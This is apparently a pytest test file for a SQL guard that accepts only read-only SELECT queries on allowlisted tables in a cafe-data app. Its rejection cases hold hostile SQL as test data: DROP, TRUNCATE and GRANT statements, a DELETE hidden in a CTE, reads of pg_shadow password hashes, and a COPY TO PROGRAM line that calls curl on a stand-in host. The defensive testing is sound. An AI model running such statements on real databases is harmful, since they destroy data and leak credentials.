import pytest

from app.sql_guard import SqlGuardError, validate_sql


def test_plain_select_passes():
    assert validate_sql("SELECT name FROM cafes") == "SELECT name FROM cafes"


def test_delete_is_rejected():
    with pytest.raises(SqlGuardError):
        validate_sql("DELETE FROM cafes")


def test_multiple_statements_are_rejected():
    with pytest.raises(SqlGuardError, match="單一"):
        validate_sql("SELECT 1; DELETE FROM cafes")


@pytest.mark.parametrize("sql", ["", "   ", ";", " ; ;"])
def test_empty_sql_is_rejected(sql):
    with pytest.raises(SqlGuardError, match="空"):
        validate_sql(sql)


def test_unparseable_sql_is_rejected():
    with pytest.raises(SqlGuardError, match="無法解析"):
        validate_sql("SELEC name FROM")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT name FROM cafes WHERE city = '台北市' UNION SELECT name FROM cafes WHERE city = '新北市'",
        "SELECT count(*) FROM cafes;",
        "WITH t AS (SELECT district FROM cafes) SELECT district, count(*) FROM t GROUP BY district",
    ],
)
def test_other_read_only_queries_pass(sql):
    validate_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO cafes (name, address) VALUES ('x', 'y')",
        "UPDATE cafes SET rating = 5",
        "DROP TABLE cafes",
        "TRUNCATE cafes",
        "CREATE TABLE t (i int)",
        "GRANT ALL ON cafes TO PUBLIC",
        "COPY cafes TO '/tmp/x'",
        "COPY (SELECT * FROM cafes) TO PROGRAM 'curl evil.example'",
    ],
)
def test_write_and_ddl_statements_are_rejected(sql):
    with pytest.raises(SqlGuardError):
        validate_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        # Postgres allows data-modifying statements inside a CTE of a SELECT.
        "WITH d AS (DELETE FROM cafes RETURNING id) SELECT count(*) FROM d",
        # SELECT INTO creates a new table.
        "SELECT * INTO cafes_copy FROM cafes",
    ],
)
def test_writes_hidden_inside_a_select_are_rejected(sql):
    with pytest.raises(SqlGuardError, match="不允許"):
        validate_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM pg_shadow",  # system catalog: password hashes
        "SELECT * FROM pg_catalog.pg_user",
        "SELECT table_name FROM information_schema.tables",
        "SELECT name FROM cafes WHERE id IN (SELECT id FROM secret_table)",  # hidden in a subquery
        "SELECT * FROM other_schema.cafes",  # same name, different schema
        "SELECT * FROM genbi.public.cafes",  # three-part name
        "SELECT c.name FROM cafes c JOIN users u ON u.id = c.id",
    ],
)
def test_tables_outside_the_allowlist_are_rejected_with_available_tables_listed(sql):
    with pytest.raises(SqlGuardError, match="可用的資料表：cafes"):
        validate_sql(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "WITH t AS (SELECT city FROM CAFES) SELECT city FROM t",  # CTE name + upper case
        'SELECT name FROM "cafes"',
        "SELECT name FROM public.cafes",
        "SELECT a.name FROM cafes a JOIN cafes b ON a.district = b.district",
        "SELECT n FROM generate_series(1, 3) AS g(n)",  # table function, not a table
    ],
)
def test_allowlisted_tables_ctes_and_public_schema_pass(sql):
    validate_sql(sql)


def test_allowlist_can_be_configured():
    with pytest.raises(SqlGuardError, match="可用的資料表：search_logs"):
        validate_sql("SELECT name FROM cafes", allowed_tables={"search_logs"})
